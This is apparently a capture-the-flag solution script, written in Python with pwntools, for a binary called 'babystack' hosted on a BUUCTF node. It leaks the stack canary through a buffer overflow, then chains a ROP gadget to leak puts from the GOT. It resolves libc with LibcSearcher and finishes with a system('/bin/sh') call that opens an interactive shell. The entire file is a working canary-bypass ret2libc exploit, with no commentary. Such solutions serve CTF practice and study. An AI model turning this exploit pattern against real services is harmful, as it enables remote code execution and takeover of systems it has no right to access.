from pwn import *
from LibcSearcher import *
context.log_level = 'debug'
elf = ELF('./babystack')
sh = elf.process()
sh = remote('node3.buuoj.cn', 27424)
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
pop_rdi = 0x400a93
main = 0x400908

sh.recvuntil('>> ')
sh.sendline('1')
payload = 'A' * 0x88
sh.sendline(payload)
sh.recvuntil('>> ')
sh.sendline('2')

sh.recvline()
canary = u64('\x00' + sh.recv()[0:7])
print hex(canary)

sh.sendline('1')
payload = 'A' * 0x88 + p64(canary)
payload += p64(0x0)

payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(main)
sh.sendline(payload)


sh.recvuntil('>> ')
sh.sendline('3')

libc_puts = u64(sh.recv()[0:6] + '\x00\x00')
print 'libc_puts -> ' + hex(libc_puts)
libc = LibcSearcher('puts', libc_puts)
libc_base = libc_puts - libc.dump('puts')
print 'libc_base -> ' + hex(libc_base)
libc_sys = libc_base + libc.dump('system')
libc_sh = libc_base + libc.dump('str_bin_sh')

#gdb.attach(sh)

sh.sendline('1')
payload = 'A' * 0x88 + p64(canary)
payload += p64(0x0)

payload += p64(pop_rdi)
payload += p64(libc_sh)
payload += p64(libc_sys)
sh.sendline(payload)

sh.recvuntil('>> ')
sh.sendline('3')

sh.interactive()
